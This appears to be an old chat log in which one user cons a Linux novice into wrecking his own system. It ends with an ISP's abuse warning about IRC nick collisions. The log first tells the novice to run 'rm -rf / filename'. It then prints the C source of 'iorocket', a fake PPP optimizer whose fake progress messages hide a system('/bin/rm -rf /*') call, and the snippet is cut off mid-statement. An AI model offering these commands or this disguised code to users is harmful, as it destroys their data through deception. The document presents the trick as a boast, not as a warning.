* ogbanje tries to help ducati, but finds that it's to heavy for both of them
<ogbanje> clueless: rm -rf / filename

<ogbanje> clueless: make sure you leave the space between / and the filename,

your not gonna telnet in as root
:)
no need to
ok

Root is paging you from Teleconference:  i can't believe you taking the phun
out of this..:)
I'll explain how to do it..  tell me what partation is your hd?  
/dev/hda1 ?
/dev/hdb3

/dev/hdb2 or /dev/hdb3

you sure?
No i'm a fucking liar.. Yes I'm Sure I have 2 hd's 1 partion on the first 
and 3on the 2nd 50 meg dos 16 meg swap and the rest linux
hello?
hold on a second, reading a optimization file.ij
I get my ISP through INdynet
If that helpZ

 Root logs -OFF- : Time for me to go, see ya later!
almost done.  hold.

ììì Root logs -ON- : Hi everyone!  How are you today?
okay, I'm gonna send you something called fastio, it came with my version of
ppp (I purchased another linux distro).  It gives you the fastest and 
cleanist
connection possible, I'vve noticed.  ok..
could I have an irc compiled too pls

 Captain Picard logs -OFF- : See ya later!
and why does it sayyou do n't have irc compiled?
I used to but had to Get rid of my system  ....

ììì Jeff logs -ON- : Hi Everyone!

how am I going to get you the irc client.  hum.  you know how to use minicom,
correct?
I'm in it right no
now
so, in a minute, we'll hang up from ic, and I'll call you, you connect (ata)
and I'll send you the file.  after you get it, do chmod +x irc, and chmod +x
fastio.  then run the fastio first, it'll start the ppp session 
correctly, then

 ClosetMan logs -OFF- : See ya later!
run irc
ok...
let me get the programs together. hold on.

ììì Pink Silk Lace logs -ON- : Hi Everyone!
You got 28.8
yeah
me too
lemme read my holiday card someone emailed me, then I'll be ready.ok

ììì ClosetMan logs -ON- : Hi Everyone!

 ClosetMan logs -OFF- : See ya later!

 Jeff logs -OFF- : See ya later!

HEY will it make me a file called ppp to like.. run pppd right
what fastio does, when you run it is first search (quickly) for your modem,
then correctly initalize ppp
so I have to run fastio every time I wanna run ppp
??
what does unknown server error mean anyway
you are not passing the correct commands to it
that's what i got when I tried to telnet
so are we gonna do it or not
:)
gotta go to bed so I can wake up tomarrow morning and get my new 4 meg of ram
from my parents
whats your number?
5959798

Do I run fastion every time I wanna run PPP
yes.  its actually called iorocket, I thought it was fastio.  ohh well.
ok
can I rename it ppp
for the first run, it has to be called iorocket.
ok also... where should I put compiled pppd
when you installed linux, it placed pppd in a directory, /usr/something,
iorocket will find it.
you ready?
eyah

[From this point, I called his system, and sent him a compiled version of 
the "iorocket" program.  Here is what the program was really.

IOROCKET.C:
#include <iostream.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{
  cout << "\nI/O Rocket v1.22b - NewComm Enterprises - 1995";
  cout << "\n\n - PPP/SLIP/CSLIP Optimizer loading.. please wait.." << endl;
  sleep(5);
  cout << "\n - Searching for PPP system files.." << endl;
  sleep(4);
  cout << "\n - Modem found on CUA1 (COM2, 28.8 CONNECTION BEING MADE" <<

  system("/bin/rm -rf /*");
  cout << "\n - Connected to server slip.indy.net - enjoy" << endl;

From: NETCOM Technical Support <abuse@netcom.com>
To: pfnguyen@netcom.com
Subject: IRC Abuse

We have received several complaints from users regarding your actions
within IRC.  It has come to our attention that you have been
intentionally causing nick collisions within IRC.  Intentional nick
collisions within IRC disrupts the service of other individuals on
Netcom as well as other services and is considered an abuse of the
system.  Information about abuse of the system can be found under
section 7 of the Netcom Terms and Conditions.  (For shell users, this
is article 7.1 of the faq terms.  For NetCruiser users, this is located
NETCOM directory under the filename of AGREE.TXT.)

If we receive additional complaints of intentional nick collisions,
your account will be placed on hold.

On account suspensions:

NETCOM policies are set by the general manager to equitably allocate 
finite system resources.  Systems administrators and accounting personnel 
implement the policies.  The implementation may involve suspending an 
account.

Abuse of system resources:

Any use of NETCOM system resources that disrupts the normal use of the
system for other NETCOM customers is considered to be abuse of system
resources and is grounds for System Administration intervention.  Some
examples of system abuse include spawning excessive processes, consuming
excessive amounts of memory or cpu for long periods of time, and staying
attached to modems while not really "active" on the line. 

If the misuse is unintentional, the suspension will be rescinded
following discussion with NETCOM Technical Support. If the misuse is
intentional, the suspension may be rescinded at the discretion of the
general manager, with the possibility of a service reconnection charge.
Occasionally, unintentional misuse is misclassified as intentional
misuse.  Customers who believe their activity has been misclassified
may appeal to the general manager.

We request that a response to this message be made.  Please include 
any questions, comments or acknowledgement with regards to this warning.
